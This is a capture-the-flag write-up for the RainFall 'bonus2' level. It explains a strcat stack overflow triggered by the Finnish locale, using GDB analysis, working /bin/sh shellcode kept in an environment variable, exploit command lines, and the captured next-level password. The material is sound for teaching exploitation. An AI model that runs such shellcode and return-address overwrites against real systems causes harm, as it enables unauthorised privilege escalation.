# bonus2: Exploiting Buffer Overflow with Language-Specific Greetings

## Challenge Overview

The program `bonus2` reads two command-line arguments and greets the user in one of three languages (English, Finnish, or Dutch), depending on the `LANG` environment variable. The program has a buffer overflow vulnerability in the `greetuser()` function that allows us to overwrite the return address and execute arbitrary code.

## Source Code Analysis

The program consists of a `main()` function and a `greetuser()` function. Here's a summary of how it works:

1. The `main()` function:

   ```c
   int main(int argc, char **argv)
   {
     char username[40];  // Buffer to store first argument
     char message[36];   // Buffer to store second argument

     if (argc == 3) {
        //...

       // Copy arguments with potential overflow issues
       strncpy(username, argv[1], 40);  // Could fill entire buffer with no null terminator
       strncpy(message, argv[2], 32);   // Limited to 32 bytes though buffer is 36

       // Check LANG environment variable
       char *lang = getenv("LANG");
       //...

       greetuser(language, username, message);  // Call vulnerable function
     }
   }
   ```

2. The `greetuser()` function:
   ```c
   void greetuser(int language, char *username, char *message)
   {
     char greeting[4];               // Small buffer for greeting start
     char greeting_continuation[4];  // Small buffer for greeting continuation
     char full_message[64];          // Buffer for language-specific message

     if (language == 1) {
       // Finnish greeting - note the UTF-8 characters
       greeting[0] = 'H';
       greeting[1] = 'y';
       greeting[2] = 'v';
       greeting[3] = 0xC3;  // First byte of 'ä' in UTF-8
       greeting_continuation[0] = 0xA4; // Second byte of 'ä' in UTF-8
       greeting_continuation[1] = ' ';
       greeting_continuation[2] = 'p';
       greeting_continuation[3] = 'ä';
     } else if (language == 2) {
       // Dutch greeting
     } else if (language == 0) {
       // English greeting
     }

     // Vulnerable function call - no bounds checking
     strcat(greeting, greeting_continuation);
    // ...
   }
   ```

## Vulnerability

The primary vulnerability is in the `greetuser()` function, which involves multiple issues:

1. **Small Fixed-Size Buffers**:

   ```c
   char greeting[4];
   char greeting_continuation[4];
   ```

2. **Unsafe String Concatenation**:

   ```c
   strcat(greeting, greeting_continuation);
   ```

   The `strcat()` function doesn't check buffer boundaries, which leads to a buffer overflow.

3. **Language-Based Overflow**:
   When using the Finnish language setting (`LANG=fi`), the greeting "Hyvää päivää" contains UTF-8 characters that require multiple bytes, further increasing the overflow potential.

## Memory Layout Analysis with GDB

To understand the memory layout and craft our exploit, we used GDB to analyze how the program allocates and uses memory:

### Step 1: Initial Investigation

First, we set breakpoints in `greetuser()` to analyze the memory before and after the vulnerable operation:

```bash
(gdb) b greetuser
Breakpoint 1 at 0x804848a
(gdb) b *greetuser+152  # After the strcat call
Breakpoint 2 at 0x804851c
```

### Step 2: Testing with Pattern Input

We sent a pattern of characters to see what part of our input overwrites which memory locations:

```bash
(gdb) set env LANG=fi
(gdb) r "$(python -c 'print "A"*40')" "$(python -c 'print "B"*18 + "CCCC" + "D"*42')"
```

### Step 3: Examining Memory

After hitting the second breakpoint (after `strcat`), we examined the stack:

```bash
(gdb) x/80wx $esp
0xbffff4c0:     0xbffff4d0      0xbffff520      0x00000001      0x00000000
0xbffff4d0:     0xc3767948      0x20a4c3a4      0x69a4c370      0xc3a4c376
0xbffff4e0:     0x414120a4      0x41414141      0x41414141      0x41414141
0xbffff4f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff500:     0x41414141      0x41414141      0x42424141      0x42424242
0xbffff510:     0x42424242      0x42424242      0x42424242      0x43434343
0xbffff520:     0x44444444      0x44444444      0x00004444      0x00000000
```

### Step 4: Finding the Saved Return Address

We examined the frame information to locate the saved return address:

```bash
(gdb) info frame
Stack level 0, frame at 0xbffff520:
 eip = 0x804851c in greetuser; saved eip 0x43434343
 called by frame at 0xbffff524
 Arglist at 0xbffff518, args:
 Locals at 0xbffff518, Previous frame's sp is 0xbffff520
 Saved registers:
  ebp at 0xbffff518, eip at 0xbffff51c
```

This showed that our "CCCC" (0x43434343) pattern had overwritten the saved return address at position 0xbffff51c.

### Step 5: Buffer Overflow Path Analysis

By analyzing the memory layout, we determined that:

1. The Finnish greeting started at 0xbffff4d0
2. Our username input started appearing at 0xbffff4e0
3. The overflow from the greeting concatenation eventually reached the saved return address at 0xbffff51c

### Step 6: Exploit Testing

We tested our understanding by crafting an exploit that redirected execution to our shellcode:

```bash
(gdb) b *greetuser+152
Breakpoint 1 at 0x804851c
(gdb) r "$(python -c 'print "\x90"*(40-21) + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')" "$(python -c 'print "B"*18 + "\x80\xf5\xff\xbf" + "D"*12')"
```

Upon execution, we encountered a segmentation fault due to stack corruption issues. The stack frame had been corrupted with our 'B' characters:

```bash
(gdb) info frame
Stack level 0, frame at 0x4242424a:
 eip = 0xbffff588; saved eip Cannot access memory at address 0x42424246
```

## Exploitation

After thoroughly understanding the memory layout, we developed a reliable exploitation strategy using environment variables:

### Step 1: Create Helper Program

We created a C program to find the address of our shellcode in the environment:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char *addr = getenv("SHELLCODE");
    if (addr) {
        printf("SHELLCODE address: %p\n", addr);
    } else {
        printf("SHELLCODE not found\n");
    }
    return 0;
}
```

### Step 2: Set Up Shellcode in Environment

We placed our shellcode in an environment variable with a NOP sled:

```bash
export SHELLCODE=$(python -c 'print "\x90"*200 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
```

### Step 3: Find Shellcode Address

We found our shellcode's address in a clean environment:

```bash
bonus2@RainFall:~$ env -i SHELLCODE=$SHELLCODE /tmp/get_shellcode_addr
SHELLCODE address: 0xbfffff06
```

### Step 4: Craft Final Exploit

Using our understanding of the memory layout, we crafted our final exploit with:

- First argument: 40 'A's to fill the username buffer
- Second argument: 18 'B's for padding + the shellcode address + 7 'C's padding

```bash
env -i SHELLCODE=$SHELLCODE LANG=fi ./bonus2 "$(python -c 'print "A"*40')" "$(python -c 'print "B"*18 + "\x06\xff\xff\xbf" + "C"*7')"
```

## Getting the Password

After executing our exploit, we successfully obtained a shell as `bonus3`:

```bash
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB���CCCCCCC
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

## Moving to Next Level

Use the password to log in as `bonus3`:

```bash
su bonus3
# Enter password: 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
